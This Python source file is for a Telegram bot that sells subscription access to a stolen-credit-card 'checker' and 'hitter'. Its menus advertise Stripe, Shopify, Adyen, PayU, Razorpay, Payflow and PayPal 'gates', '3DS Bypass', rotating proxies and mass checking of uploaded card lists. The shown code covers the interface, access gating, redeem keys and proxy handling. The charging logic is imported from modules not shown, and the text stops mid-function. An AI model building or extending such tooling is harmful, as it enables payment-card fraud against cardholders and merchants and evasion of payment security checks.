# ══════════════════════════════════════════════════════════════════════════════
#  bot.py — P U S S Y build v10
#  PART 1 — Setup, fonts, emoji engine, pools, gates, sites, proxy
# ══════════════════════════════════════════════════════════════════════════════

import os, re, json, time, random, string, asyncio, logging
from io import BytesIO
from logging.handlers import RotatingFileHandler

from aiogram import Bot, Dispatcher, types, Router, F, BaseMiddleware
from aiogram.filters import Command, CommandStart
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode, ChatMemberStatus
from aiogram.exceptions import (
    TelegramRetryAfter, TelegramBadRequest,
    TelegramForbiddenError, TelegramNotFound,
)

import auth, checker_bridge, hit, adyen_engine
import payu as _payu_mod
import razorpay as _rz_mod
import payflow as _pf_mod
import paypal_cvv as _pp_mod
from helpers import (
    parse_proxy_format, test_proxy, bin_lookup,
    extract_cc, close_session, CC_PATTERN,
)


# ── ENV ─────────────────────────────────────────────────────────────────────
def _env_int(name, default=0):
    try: return int(os.getenv(name, str(default)).strip())
    except (ValueError, AttributeError): return default

def _env_int_list(name):
    raw = (os.getenv(name) or "").strip()
    if not raw: return []
    out = []
    for c in raw.split(","):
        c = c.strip()
        if c:
            try: out.append(int(c))
            except ValueError: pass
    return out


BOT_TOKEN      = (os.getenv("BOT_TOKEN") or "").strip()
OWNER_ID       = _env_int("OWNER_ID")
ADMIN_IDS      = _env_int_list("ADMIN_IDS")
CHANNEL_ID     = _env_int("CHANNEL_ID")
GROUP_ID       = _env_int("GROUP_ID")
LOG_CHANNEL_ID = _env_int("LOG_CHANNEL_ID")
CHANNEL_LINK   = (os.getenv("CHANNEL_LINK") or "").strip()
GROUP_LINK     = (os.getenv("GROUP_LINK") or "").strip()
if not BOT_TOKEN:
    raise SystemExit("❌ BOT_TOKEN env var missing.")

BOT_NAME       = "XD"
OWNER_USERNAME = "@abusemen"
OWNER_NAME     = "@stephen #𝗮𝗯𝘂𝘀𝗲"

auth.OWNER_ID = OWNER_ID
if hasattr(auth, "_admins"):
    try: auth._admins = set(ADMIN_IDS)
    except Exception: pass


# ── LOGGING ─────────────────────────────────────────────────────────────────
_LOG_DIR = os.path.dirname(os.path.abspath(__file__))
_FMT = logging.Formatter("%(asctime)s │ %(levelname)s │ %(name)s │ %(message)s",
                         datefmt="%Y-%m-%d %H:%M:%S")
_root = logging.getLogger(); _root.setLevel(logging.INFO)
_ch = logging.StreamHandler(); _ch.setFormatter(_FMT); _root.addHandler(_ch)
try:
    _fh = RotatingFileHandler(os.path.join(_LOG_DIR, "bot.log"),
                              maxBytes=10*1024*1024, backupCount=5, encoding="utf-8")
    _fh.setFormatter(_FMT); _root.addHandler(_fh)
except Exception: pass
logging.getLogger("httpx").setLevel(logging.WARNING)
logging.getLogger("httpcore").setLevel(logging.WARNING)
log = logging.getLogger("bot")


# ── PATHS ───────────────────────────────────────────────────────────────────
BASE_DIR   = os.path.dirname(os.path.abspath(__file__))
PROXY_FILE = os.path.join(BASE_DIR, "proxy.json")
SITES_JSON = os.path.join(BASE_DIR, "sites.json")
SITES_FILE = os.path.join(BASE_DIR, "sites.txt")
MAINT_FILE = os.path.join(BASE_DIR, "maintenance.json")


# ── MAINTENANCE ─────────────────────────────────────────────────────────────
_maintenance = {"active": False, "reason": "", "by": 0, "since": 0}

def _load_maintenance():
    global _maintenance
    try:
        with open(MAINT_FILE, "r", encoding="utf-8") as f:
            _maintenance = json.load(f)
    except Exception:
        _maintenance = {"active": False, "reason": "", "by": 0, "since": 0}

def _save_maintenance():
    try:
        with open(MAINT_FILE, "w", encoding="utf-8") as f:
            json.dump(_maintenance, f, indent=2)
    except Exception as e: log.error("maint save: %s", e)

def in_maintenance(): return bool(_maintenance.get("active"))
_load_maintenance()


# ══════════════════════════════════════════════════════════════════════════════
#  TYPEFACES — Sans-Serif Bold (head) · Monospace (body + digit)
# ══════════════════════════════════════════════════════════════════════════════

_HEAD, _BODY, _DIGIT = {}, {}, {}
for _i, _c in enumerate("ABCDEFGHIJKLMNOPQRSTUVWXYZ"):
    _HEAD[_c] = chr(0x1D5D4 + _i)
for _i, _c in enumerate("abcdefghijklmnopqrstuvwxyz"):
    _HEAD[_c] = chr(0x1D5EE + _i)
for _i, _c in enumerate("0123456789"):
    _HEAD[_c] = chr(0x1D7EC + _i)
for _i, _c in enumerate("ABCDEFGHIJKLMNOPQRSTUVWXYZ"):
    _BODY[_c] = chr(0x1D670 + _i)
for _i, _c in enumerate("abcdefghijklmnopqrstuvwxyz"):
    _BODY[_c] = chr(0x1D68A + _i)
for _i, _c in enumerate("0123456789"):
    _BODY[_c]  = chr(0x1D7F6 + _i)
    _DIGIT[_c] = chr(0x1D7F6 + _i)

def head(t):  return "".join(_HEAD.get(c, c) for c in str(t))
def body(t):  return "".join(_BODY.get(c, c) for c in str(t))
def digit(t): return "".join(_DIGIT.get(c, c) for c in str(t))
def bold(t):  return head(t)


# ══════════════════════════════════════════════════════════════════════════════
#  PREMIUM EMOJI ENGINE — ID → natural glyph, wraps in <tg-emoji>
# ══════════════════════════════════════════════════════════════════════════════

_EMOJI_GLYPH = {
    # crystal / gem / ice
    "5787435351521889877": "🧊", "5789514274606943819": "🧊",
    "5801005158959683238": "🧊", "5229045747130843073": "🧊",
    "5226929552319594190": "🧊", "5427168083074628963": "🧊",
    "5463046637842608206": "🧊", "5375312095346704820": "🧊",
    "5787368831068410589": "🧊", "5787529402715737895": "🧊",
    "5852848953275453389": "🧊", "5787193059531821181": "🧊",
    "5789828571723730889": "🧊", "5803177330079700378": "🧊",
    "5992403319874653249": "🧊", "5789902320607170281": "🧊",
    "5800709991627232190": "🧊", "5800758919894666807": "🧊",
    "5789574868005557666": "🧊", "5800909402663816144": "🧊",
    # crown
    "5787412175878361514": "👑", "5800950728839139945": "👑",
    "5850650604329766810": "👑", "5996564258421215002": "👑",
    "5229011542011299168": "👑", "5217822164362739968": "👑",
    # fire
    "5801139183414153005": "🔥", "5256047523620995497": "🔥",
    "5787131512650470512": "🔥", "5787568358069112518": "🔥",
    "5787678420901039906": "🔥", "5787571660898963761": "🔥",
    "5787672970587541975": "🔥", "5787584060469547008": "🔥",
    "5800942216213958438": "🔥", "5787236919737848366": "🔥",
    "5787565192678216265": "🔥", "5992053533443100269": "🔥",
    "6023967962245893649": "🔥", "5789636316102659794": "🔥",
    "5875366363001788391": "🔥", "5882118532627439887": "🔥",
    "5882184473260333214": "🔥", "5816951388982221159": "🔥",
    "5798473696645487972": "🔥", "5832440600124726538": "🔥",
    "5845963725562976445": "🔥", "5857313460110498417": "🔥",
    "5857389309232945817": "🔥", "5906930056185255802": "🔥",
    "5796495743946594594": "🔥",
    # bolt
    "5226813248900187912": "⚡", "5789633099172154740": "⚡",
    "5789690484230196266": "⚡", "5424972470023104089": "⚡",
    "5967666107840993442": "⚡", "5465465194056525619": "⚡",
    # rocket
    "5800883899148013119": "🚀", "5800997823155539597": "🚀",
    "5787548987766607930": "🚀", "5787244620614209190": "🚀",
    "5787382197006635012": "🚀",
    # heart
    "5787624720924938691": "❤️", "5787539650507706439": "❤️",
    "5906509067785866421": "❤️", "5787429974222835576": "❤️",
    "5787516208576204868": "❤️", "5787175265482314416": "❤️",
    "5787151175010750937": "❤️", "5801025375370743669": "❤️",
    "5801179045005627743": "❤️", "5787406248823492639": "❤️",
    # star
    "5789865066060844365": "⭐", "5787147833526193811": "⭐",
    "5992169656473881872": "⭐", "5992369565726674435": "⭐",
    "5996789675484778079": "⭐", "5994529208427088542": "⭐",
    "5992581711341292943": "⭐", "5994721863480118593": "⭐",
    "5886285376754031265": "⭐", "5226928895189598791": "⭐",
    "5438496463044752972": "⭐", "5325547803936572038": "⭐",
    "5801041928174702734": "⭐", "5787456925142618547": "⭐",
    "5789463778676445427": "⭐",
    "5816829278767028258": "✨", "5850389345764122229": "✨",
    "5226702984204797593": "✨", "5321548429174795341": "✨",
    # check
    "5206607081334906820": "✅", "6046256574769400803": "✅",
    "5222079954421818267": "✅", "5463413771647069835": "✅",
    "5341498088408234504": "✅", "5807810126618299919": "✅",
    "5463423955014529788": "✅",
    # cross
    "5210952531676504517": "❌", "5260293700088511294": "❌",
    "5240241223632954241": "❌", "5462882007451185227": "❌",
    "5463358164705489689": "❌", "5454350746407419714": "❌",
    "5372825386591732174": "❌", "5445267414562389170": "❌",
    "5452069934089641166": "❌", "5210956306952758910": "❌",
    # time
    "5454415424319931791": "⏱️", "5373236586760651455": "⏱️",
    "5386367538735104399": "⏱️", "5382357040008021292": "⏱️",
    # link
    "5321204943460266251": "🔗", "5321166331704275015": "🔗",
    "5224518800061245598": "🔗", "5224369957969603463": "🔗",
    "5224216473018314447": "🔗",
    # gift / bow
    "5789910601304116778": "🍌", "5787195069576515668": "🎁",
    "5454089058345042483": "🎁", "5787548987766607930": "🎁",
    # skull / warn
    "5321108551509242397": "☠️", "5323793477299887524": "☠️",
    "5447647474984449520": "☠️",
    # checker signature emoji
    "6181400637020839339": "⚡",
}


def pe(emoji_id, fallback="✨"):
    """Wrap a premium emoji ID in <tg-emoji> with its natural fallback glyph."""
    if not emoji_id: return ""
    glyph = _EMOJI_GLYPH.get(str(emoji_id), fallback)
    return f'<tg-emoji emoji-id="{emoji_id}">{glyph}</tg-emoji>'


def pick(pool, fallback="✨"):
    """Pick a random premium emoji from pool and wrap it correctly."""
    pool = list(pool) if pool else []
    return pe(random.choice(pool), fallback=fallback) if pool else ""


# ── POOLS ───────────────────────────────────────────────────────────────────
SLOT_EMOJI_ID    = "5222079954421818267"
CHECKER_EMOJI_ID = "6181400637020839339"      # ← always before checker name

# gem/crystal (main accent for result headers)
GEM_POOL = ["5787435351521889877","5789514274606943819","5801005158959683238",
            "5229045747130843073","5226929552319594190","5427168083074628963",
            "5463046637842608206","5375312095346704820","5787368831068410589",
            "5787529402715737895","5852848953275453389","5787193059531821181"]
# crown
CROWN_POOL = ["5787412175878361514","5800950728839139945","5850650604329766810",
              "5996564258421215002","5229011542011299168","5217822164362739968"]
# fire
FIRE_POOL = ["5801139183414153005","5256047523620995497","5787131512650470512",
             "5787568358069112518","5787678420901039906","5787571660898963761",
             "5787672970587541975","5789636316102659794","5875366363001788391",
             "5882118532627439887","5882184473260333214","5816951388982221159"]
# bolt
BOLT_POOL = ["5226813248900187912","5789633099172154740","5789690484230196266",
             "5424972470023104089","5967666107840993442","5465465194056525619"]
# rocket
ROCKET_POOL = ["5800883899148013119","5800997823155539597","5787548987766607930",
               "5787244620614209190","5787382197006635012"]
# heart
HEART_POOL = ["5787624720924938691","5787539650507706439","5906509067785866421",
              "5787429974222835576","5787516208576204868","5787175265482314416",
              "5787151175010750937","5801025375370743669"]
# star
STAR_POOL = ["5789865066060844365","5787147833526193811","5992169656473881872",
             "5992369565726674435","5996789675484778079","5994529208427088542",
             "5801041928174702734","5787456925142618547","5789463778676445427"]
# sparkle
SPARKLE_POOL = ["5816829278767028258","5850389345764122229","5226702984204797593",
                "5321548429174795341"]
# check
CHECK_POOL = ["5206607081334906820","6046256574769400803","5222079954421818267",
              "5463413771647069835","5341498088408234504"]
# cross
CROSS_POOL = ["5210952531676504517","5260293700088511294","5240241223632954241",
              "5462882007451185227","5463358164705489689"]
# time
TIME_POOL = ["5454415424319931791","5373236586760651455","5386367538735104399",
             "5382357040008021292"]
# link
LINK_POOL = ["5321204943460266251","5321166331704275015","5224518800061245598",
             "5224369957969603463","5224216473018314447"]
# gift / bow
GIFT_POOL = ["5789910601304116778","5787195069576515668","5454089058345042483"]
# skull / warn
SKULL_POOL = ["5321108551509242397","5323793477299887524","5447647474984449520"]
# cart
CART_POOL = ["5801139183414153005","5256047523620995497","5787131512650470512"]
# spider
SPIDER_POOL = ["5787568358069112518","5787678420901039906","5787571660898963761"]
# boom
BOOM_POOL = ["5226813248900187912","5789633099172154740","5789690484230196266"]
# robot
ROBOT_POOL = ["5787548987766607930","5787244620614209190","5787382197006635012"]


def _btn_icon(pool): return random.choice(pool) if pool else None


# ══════════════════════════════════════════════════════════════════════════════
#  GATE REGISTRY
# ══════════════════════════════════════════════════════════════════════════════

GATES = [
    ("shopify", "Shopify",      "single", "Shopify Payments"),
    ("stripe",  "Stripe",       "single", "Stripe Checkout"),
    ("adyen",   "Adyen",        "single", "Adyen Pay-by-link"),
    ("payu",    "PayU",         "single", "PayU 1$"),
    ("rz",      "Razorpay",     "single", "Razorpay 1₹"),
    ("pf",      "Payflow",      "single", "Payflow 5$"),
    ("pp",      "PayPal",       "single", "PayPal 0.10$"),
    ("msh",     "Shopify Mass", "mass",   "Shopify mass check"),
]


# ── SITES ───────────────────────────────────────────────────────────────────
_sites_cache = None; _sites_mtime = 0.0

def _load_sites():
    global _sites_cache, _sites_mtime
    src = SITES_JSON if os.path.isfile(SITES_JSON) else SITES_FILE
    try: mt = os.path.getmtime(src)
    except OSError: return []
    if _sites_cache is not None and mt == _sites_mtime: return _sites_cache
    urls = []
    if src == SITES_JSON:
        try:
            with open(src, "r", encoding="utf-8") as f: data = json.load(f)
            if isinstance(data, list):
                for e in data:
                    s = (e.get("Site") or "").strip().rstrip("/")
                    if s:
                        if not s.startswith("http"): s = "https://" + s
                        urls.append(s)
        except Exception as ex: log.error("sites.json: %s", ex)
    else:
        try:
            with open(src, "r", encoding="utf-8") as f:
                urls = [l.strip().rstrip("/") for l in f if l.strip()]
        except Exception as ex: log.error("sites.txt: %s", ex)
    seen = set()
    _sites_cache = [u for u in urls if not (u in seen or seen.add(u))]
    _sites_mtime = mt
    return _sites_cache

def get_random_site():
    s = _load_sites()
    return random.choice(s) if s else None


# ── PROXY STORAGE ───────────────────────────────────────────────────────────
_proxy_cache = None; _proxy_mtime = 0.0
MAX_PROXIES_PER_USER = 30

def _load_proxies():
    global _proxy_cache, _proxy_mtime
    try: mt = os.path.getmtime(PROXY_FILE)
    except OSError: return {}
    if _proxy_cache is not None and mt == _proxy_mtime: return _proxy_cache
    try:
        with open(PROXY_FILE, "r", encoding="utf-8") as f:
            _proxy_cache = json.load(f); _proxy_mtime = mt
            return _proxy_cache
    except Exception: return {}

def _save_proxies(data):
    global _proxy_cache, _proxy_mtime
    with open(PROXY_FILE, "w", encoding="utf-8") as f:
        json.dump(data, f, indent=2, ensure_ascii=False)
    _proxy_cache = data
    try: _proxy_mtime = os.path.getmtime(PROXY_FILE)
    except OSError: _proxy_mtime = 0.0

def get_user_proxies(user_id):
    data = _load_proxies()
    proxies = data.get(str(user_id), [])
    if isinstance(proxies, dict): proxies = [proxies] if proxies else []
    if isinstance(proxies, str):  proxies = [proxies] if proxies.strip() else []
    out = []
    for p in proxies:
        if isinstance(p, dict): out.append(p)
        elif isinstance(p, str) and p.strip():
            parsed = parse_proxy_format(p.strip())
            if parsed: out.append(parsed)
    return out

def get_user_proxy(user_id):
    lst = get_user_proxies(user_id)
    return random.choice(lst) if lst else None

def add_user_proxies(user_id, new):
    data = _load_proxies()
    existing = data.get(str(user_id), [])
    if isinstance(existing, dict): existing = [existing] if existing else []
    existing.extend(new)
    data[str(user_id)] = existing[:MAX_PROXIES_PER_USER]
    _save_proxies(data)

def del_user_proxy(user_id):
    data = _load_proxies()
    data.pop(str(user_id), None)
    _save_proxies(data)# ══════════════════════════════════════════════════════════════════════════════
#  PART 2 — Bot, middleware, join/premium gate
# ══════════════════════════════════════════════════════════════════════════════

import concurrent.futures

bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
dp = Dispatcher(); router = Router(); dp.include_router(router)
CHECKER_POOL = concurrent.futures.ThreadPoolExecutor(max_workers=200)


class _MaintenanceGate(BaseMiddleware):
    async def __call__(self, handler, event, data):
        if not in_maintenance(): return await handler(event, data)
        user = data.get("event_from_user")
        if user and user.id == OWNER_ID: return await handler(event, data)
        return


class _Throttle(BaseMiddleware):
    _RATE, _WINDOW, _LIMIT = 0.4, 10.0, 20
    _last = {}; _events = {}
    async def __call__(self, handler, event, data):
        user = data.get("event_from_user")
        if not user: return await handler(event, data)
        uid = user.id
        if auth.is_banned(uid): return
        now = time.monotonic()
        ev = [t for t in self._events.get(uid, []) if now - t < self._WINDOW]
        ev.append(now); self._events[uid] = ev
        if len(ev) >= self._LIMIT:
            try: auth.ban_user(uid)
            except Exception: pass
            return
        last = self._last.get(uid, 0.0)
        if now - last < self._RATE:
            await asyncio.sleep(self._RATE - (now - last))
        self._last[uid] = time.monotonic()
        return await handler(event, data)


dp.message.middleware(_MaintenanceGate())
dp.callback_query.middleware(_MaintenanceGate())
dp.message.middleware(_Throttle())
dp.callback_query.middleware(_Throttle())


async def safe_edit(msg, text, **kwargs):
    for _ in range(2):
        try:
            await msg.edit_text(text, **kwargs); return True
        except TelegramRetryAfter as e:
            await asyncio.sleep(min(e.retry_after + 1, 15))
        except TelegramBadRequest as e:
            emsg = str(e).lower()
            if "message is not modified" in emsg: return True
            if any(x in emsg for x in ("message can't be edited", "message to edit not found",
                                        "chat not found", "message_id_invalid")): return False
            return False
        except (TelegramForbiddenError, TelegramNotFound): return False
        except Exception as e:
            log.error("safe_edit: %s", e, exc_info=True); return False
    return False


@dp.errors()
async def global_error_handler(event):
    exc = event.exception
    if isinstance(exc, TelegramRetryAfter):
        await asyncio.sleep(exc.retry_after + 1); return True
    if isinstance(exc, TelegramForbiddenError): return True
    log.error("Unhandled: %s", exc, exc_info=True); return True


# ── JOIN GATE ───────────────────────────────────────────────────────────────
_join_cache = {}
_OK_TTL, _NO_TTL = 300, 30

async def check_user_joined(user_id, force=False):
    now = time.time()
    if not force:
        cached = _join_cache.get(user_id)
        if cached:
            ttl = _OK_TTL if cached[0] else _NO_TTL
            if now - cached[1] < ttl: return cached[0]
    try:
        valid = {ChatMemberStatus.MEMBER, ChatMemberStatus.ADMINISTRATOR, ChatMemberStatus.CREATOR}
        ch = await bot.get_chat_member(CHANNEL_ID, user_id)
        gr = await bot.get_chat_member(GROUP_ID, user_id)
        result = ch.status in valid and gr.status in valid
    except Exception: result = False
    _join_cache[user_id] = (result, now)
    return result


def join_keyboard():
    return {"inline_keyboard": [
        [
            {"text": "Join Channel", "url": CHANNEL_LINK,
             "icon_custom_emoji_id": _btn_icon(FIRE_POOL), "style": "primary"},
            {"text": "Join Group", "url": GROUP_LINK,
             "icon_custom_emoji_id": _btn_icon(HEART_POOL), "style": "primary"},
        ],
        [{"text": "Verify Joined", "callback_data": "verify_join",
          "icon_custom_emoji_id": _btn_icon(CHECK_POOL), "style": "success"}],
    ]}


JOIN_MSG = (
    f"{pick(FIRE_POOL)} {bold('Access Restricted')}\n\n"
    f"{pick(HEART_POOL)} {bold('You must join our channel and group to use this bot.')}\n\n"
    f"{pick(ROCKET_POOL)} {bold('Tap the buttons below to join, then tap Verify.')}"
)


# ── PREMIUM GATE ────────────────────────────────────────────────────────────
def has_active_plan(user_id, chat_id):
    try: return bool(auth.has_premium_access(user_id, chat_id))
    except Exception: return False


def access_denied_msg(user_id, reason="No permission to use this bot."):
    return (
        f"<code>[≡] {head('Access')} » {head('Denied')} {pick(CROSS_POOL)}\n"
        f"──────────────\n"
        f"[≡] {head('Reason')} » {body(reason)} {pick(SKULL_POOL)}\n"
        f"[≡] {head('Your ID')} » {digit(str(user_id))} {pick(CROWN_POOL)}\n"
        f"──────────────\n"
        f"[≡] {head('Unlock')} » /redeem {body('KEY')}\n"
        f"[≡] {head('or Contact')} » {body('@stephen #𝗮𝗯𝘂𝘀𝗲')} {pick(GIFT_POOL)}</code>"
    )


def access_denied_kb():
    return {"inline_keyboard": [
        [{"text": "Redeem Key", "callback_data": "xd_cmd:redeem",
          "icon_custom_emoji_id": _btn_icon(GIFT_POOL), "style": "success"},
         {"text": "Contact", "callback_data": "xd_contact",
          "icon_custom_emoji_id": _btn_icon(ROBOT_POOL), "style": "primary"}],
    ]}


# ── KEY HELPERS ─────────────────────────────────────────────────────────────
def _gen_key():
    """Generate 67-XXXXXXXX key format."""
    alphabet = string.ascii_uppercase + string.digits
    return f"67-{''.join(random.choice(alphabet) for _ in range(8))}"# ══════════════════════════════════════════════════════════════════════════════
#  PART 3 — /start UI, submenus, checker with gates
# ══════════════════════════════════════════════════════════════════════════════

DIV = "──────────────"


def build_welcome_msg():
    return (
        f"<code>"
        f"[≡] {head('Bot')} » {body('XD')} »  {pick(STAR_POOL)}\n"
        f"[≡] {head('Type')} » {body('Premium CC Checker')} » {pick(GEM_POOL)}\n"
        f"\n"
        f"{DIV}\n"
        f"\n"
        f"[≡] {head('Gate')} » {body('Stripe · Shopify · Adyen')} » {pick(STAR_POOL)}\n"
        f"[≡] {head('3DS')} »  {body('Bypass Supported')} »  {pick(CHECK_POOL)}\n"
        f"[≡] {head('Proxy')} » {body('HTTP · SOCKS4 · SOCKS5')} » {pick(LINK_POOL)}\n"
        f"[≡] {head('Speed')} » {body('Multi-worker · Rotating')} » {pick(STAR_POOL)}\n"
        f"\n"
        f"{DIV}\n"
        f"\n"
        f"[≡] {head('Menu')} » {body('Select option below')} » {pick(STAR_POOL)}\n"
        f"</code>"
    )


def menu_keyboard():
    return {"inline_keyboard": [
        [
            {"text": "Checker", "callback_data": "menu_check",
             "icon_custom_emoji_id": _btn_icon(CART_POOL), "style": "danger"},
            {"text": "Hitter", "callback_data": "xd_hitter",
             "icon_custom_emoji_id": _btn_icon(SPIDER_POOL), "style": "danger"},
        ],
        [
            {"text": "Plans", "callback_data": "xd_plans",
             "icon_custom_emoji_id": _btn_icon(CROWN_POOL), "style": "success"},
            {"text": "Profile", "callback_data": "menu_profile",
             "icon_custom_emoji_id": _btn_icon(GEM_POOL), "style": "primary"},
        ],
        [
            {"text": "Commands", "callback_data": "xd_commands",
             "icon_custom_emoji_id": _btn_icon(BOOM_POOL), "style": "primary"},
            {"text": "Contact", "callback_data": "xd_contact",
             "icon_custom_emoji_id": _btn_icon(ROBOT_POOL), "style": "success"},
        ],
    ]}


@router.message(CommandStart())
async def cmd_start(message: types.Message):
    try:
        auth.save_user(message.from_user.id, message.from_user.username,
                       message.from_user.full_name)
    except Exception: pass
    if not await check_user_joined(message.from_user.id):
        await message.reply(JOIN_MSG, reply_markup=join_keyboard()); return
    if auth.is_banned(message.from_user.id):
        await message.reply(f"{pick(CROSS_POOL)} {bold('You are banned from this bot!')}"); return
    await message.reply(build_welcome_msg(), reply_markup=menu_keyboard())


@router.callback_query(F.data == "verify_join")
async def cb_verify_join(callback: types.CallbackQuery):
    if not await check_user_joined(callback.from_user.id, force=True):
        await callback.answer(bold("You have not joined yet!"), show_alert=True); return
    await callback.answer(bold("Verified! Welcome!"))
    await safe_edit(callback.message, build_welcome_msg(), reply_markup=menu_keyboard())


@router.callback_query(F.data == "menu_back")
async def cb_menu_back(callback: types.CallbackQuery):
    await callback.answer()
    try: await safe_edit(callback.message, build_welcome_msg(), reply_markup=menu_keyboard())
    except Exception: pass


# ── CHECKER MENU (with My Gates) ────────────────────────────────────────────
@router.callback_query(F.data == "menu_check")
async def cb_menu_check(callback: types.CallbackQuery):
    await callback.answer()
    uid = callback.from_user.id
    if not has_active_plan(uid, callback.message.chat.id):
        try: await safe_edit(callback.message, access_denied_msg(uid),
                             reply_markup=access_denied_kb())
        except Exception: pass
        return

    text = (
        f"<code>[≡] {head('Checker')} » {head('Main Menu')} » {pick(STAR_POOL)}\n"
        f"{DIV}\n\n"
        f"[≡] {head('My Gates')} » {pick(GEM_POOL)}\n"
    )
    for key, title, mode, desc in GATES:
        text += f"[≡] {body(title)} » {body(mode)} » {pick(STAR_POOL)}\n"
    text += (
        f"\n{DIV}\n\n"
        f"[≡] {head('Tip')} » {body('Tap a gate to open')} » {pick(CHECK_POOL)}\n"
        f"</code>"
    )

    rows = []
    gate_buttons = []
    icon_map = {
        "shopify": GEM_POOL, "stripe": BOLT_POOL, "adyen": HEART_POOL,
        "payu": FIRE_POOL, "rz": STAR_POOL, "pf": FIRE_POOL,
        "pp": GIFT_POOL, "msh": CART_POOL,
    }
    for key, title, mode, desc in GATES:
        gate_buttons.append({
            "text": f"{title} · {mode.capitalize()}",
            "callback_data": f"gate_info:{key}",
            "icon_custom_emoji_id": _btn_icon(icon_map.get(key, FIRE_POOL)),
            "style": "success" if mode == "single" else "primary",
        })
    for i in range(0, len(gate_buttons), 2):
        rows.append(gate_buttons[i:i+2])
    rows.append([{"text": "Manage Proxy", "callback_data": "xd_proxy_hint",
                  "icon_custom_emoji_id": _btn_icon(LINK_POOL), "style": "primary"}])
    rows.append([{"text": "Back", "callback_data": "menu_back",
                  "icon_custom_emoji_id": _btn_icon(CROSS_POOL), "style": "danger"}])

    try: await safe_edit(callback.message, text, reply_markup={"inline_keyboard": rows})
    except Exception: pass


@router.callback_query(F.data == "xd_hitter")
async def cb_xd_hitter(callback: types.CallbackQuery):
    await callback.answer()
    uid = callback.from_user.id
    if not has_active_plan(uid, callback.message.chat.id):
        try: await safe_edit(callback.message, access_denied_msg(uid),
                             reply_markup=access_denied_kb())
        except Exception: pass
        return
    text = (
        f"<code>[≡] {head('Hitter')} » {head('Stripe + Adyen')} » {pick(SPIDER_POOL)}\n"
        f"{DIV}\n\n"
        f"[≡] {head('Stripe')} » {body('Direct charge')} » {pick(BOLT_POOL)}\n"
        f"[≡] {body('3DS Bypass · Full BIN')}\n\n"
        f"[≡] {head('Adyen')} » {body('Pay-by-link')} » {pick(HEART_POOL)}\n"
        f"[≡] {body('Live 3DS · Worker fallback')}\n"
        f"</code>"
    )
    kb = {"inline_keyboard": [
        [
            {"text": "Stripe Hit", "callback_data": "gate_info:stripe",
             "icon_custom_emoji_id": _btn_icon(BOLT_POOL), "style": "primary"},
            {"text": "Adyen Hit", "callback_data": "gate_info:adyen",
             "icon_custom_emoji_id": _btn_icon(HEART_POOL), "style": "success"},
        ],
        [{"text": "Back", "callback_data": "menu_back",
          "icon_custom_emoji_id": _btn_icon(CROSS_POOL), "style": "danger"}],
    ]}
    try: await safe_edit(callback.message, text, reply_markup=kb)
    except Exception: pass


@router.callback_query(F.data == "xd_plans")
async def cb_xd_plans(callback: types.CallbackQuery):
    await callback.answer()
    text = (
        f"<code>[≡] {head('Plans')} » {head('Access Plans')} » {pick(CROWN_POOL)}\n"
        f"{DIV}\n\n"
        f"[≡] {head('Checks')} » {body('Unlimited')} » {pick(CHECK_POOL)}\n\n"
        f"[≡] {head('Trial')}     {body('Free')} » {pick(GIFT_POOL)}\n"
        f"[≡] {head('Duration')}  {body('3 Hours')} » {pick(TIME_POOL)}\n\n"
        f"[≡] {head('Weekly')}    ${digit('10')} » {pick(ROCKET_POOL)}\n"
        f"[≡] {head('Duration')}  {digit('7')} {body('Days')} » {pick(TIME_POOL)}\n\n"
        f"[≡] {head('Bi-Weekly')} ${digit('18')} » {pick(STAR_POOL)}\n"
        f"[≡] {head('Duration')}  {digit('15')} {body('Days')} » {pick(TIME_POOL)}\n\n"
        f"[≡] {head('Monthly')}   ${digit('30')} » {pick(CROWN_POOL)}\n"
        f"[≡] {head('Duration')}  {digit('30')} {body('Days')} » {pick(TIME_POOL)}\n\n"
        f"{DIV}\n\n"
        f"[≡] {head('Redeem')} » /redeem {body('KEY')} » {pick(GIFT_POOL)}\n"
        f"[≡] {head('Owner')}  » {body(OWNER_NAME)} » {pick(CROWN_POOL)}\n"
        f"</code>"
    )
    kb = {"inline_keyboard": [
        [{"text": "Redeem Key", "callback_data": "xd_cmd:redeem",
          "icon_custom_emoji_id": _btn_icon(GIFT_POOL), "style": "success"}],
        [{"text": "Back", "callback_data": "menu_back",
          "icon_custom_emoji_id": _btn_icon(CROSS_POOL), "style": "danger"}],
    ]}
    try: await safe_edit(callback.message, text, reply_markup=kb)
    except Exception: pass


@router.callback_query(F.data == "xd_commands")
async def cb_xd_commands(callback: types.CallbackQuery):
    await callback.answer()
    text = (
        f"<code>[≡] {head('Commands')} » {head('Reference')} » {pick(STAR_POOL)}\n"
        f"{DIV}\n\n"
        f"[≡] {head('Checker')} » {pick(STAR_POOL)}\n"
        f"[≡] /hit » {body('url cc|mm|yy|cvv')} » {pick(CHECK_POOL)}\n"
        f"[≡] /sh » {body('cc|mm|yy|cvv — Shopify single')} » {pick(STAR_POOL)}\n"
        f"[≡] /msh » {body('Mass check — reply .txt')} » {pick(STAR_POOL)}\n"
        f"[≡] /adyen » {body('url cc|mm|yy|cvv')} » {pick(STAR_POOL)}\n"
        f"[≡] {head('Checks')} » {body('Unlimited')} » {pick(CHECK_POOL)}\n\n"
        f"{DIV}\n\n"
        f"[≡] {head('Plan')} » {pick(GEM_POOL)}\n"
        f"[≡] /myplan » {body('Check plan and expiry')} » {pick(TIME_POOL)}\n"
        f"[≡] /redeem » {body('Redeem KEY')} » {pick(GIFT_POOL)}\n"
        f"[≡] /plans » {body('View plans and pricing')} » {pick(GIFT_POOL)}\n\n"
        f"{DIV}\n\n"
        f"[≡] {head('Proxy')} » {pick(LINK_POOL)}\n"
        f"[≡] /setproxy » {body('host:port:user:pass')} » {pick(LINK_POOL)}\n"
        f"[≡] /clearuserproxy » {body('Remove proxy')} » {pick(CROSS_POOL)}\n"
        f"[≡] /chkproxy » {body('Test proxy')} » {pick(TIME_POOL)}\n"
        f"</code>"
    )
    kb = {"inline_keyboard": [
        [{"text": "Back", "callback_data": "menu_back",
          "icon_custom_emoji_id": _btn_icon(CROSS_POOL), "style": "danger"}],
    ]}
    try: await safe_edit(callback.message, text, reply_markup=kb)
    except Exception: pass


@router.callback_query(F.data == "xd_contact")
async def cb_xd_contact(callback: types.CallbackQuery):
    await callback.answer()
    text = (
        f"<code>[≡] {head('Contact')} » {head('Support')} » {pick(ROBOT_POOL)}\n"
        f"{DIV}\n\n"
        f"[≡] {head('Owner')}   » {body(OWNER_USERNAME)} » {pick(GEM_POOL)}\n"
        f"[≡] {head('Name')}    » {body(OWNER_NAME)} » {pick(CROWN_POOL)}\n"
